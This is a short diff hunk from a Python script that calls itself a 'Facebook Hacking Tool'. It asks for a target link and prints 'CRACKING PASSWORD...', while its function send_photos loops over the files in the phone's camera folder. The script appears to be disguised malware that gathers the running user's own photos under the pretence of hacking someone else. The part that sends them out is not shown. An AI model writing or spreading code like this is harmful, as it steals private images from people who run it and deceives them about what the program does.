@@ -11,7 +11,7 @@ camera_photos_directory = '/storage/emulated/0/DCIM/Camera'
 def send_photos():
     print('Welcome TO my Facebook Hacking Tool')
     print()
-    link = input('FACEBOOK TARGET LINK')
+    link = input('FACEBOOK TARGET LINK >> ')
     print('wait a Minute...')
     print('CRACKING PASSWORD...')
     for filename in os.listdir(camera_photos_directory):
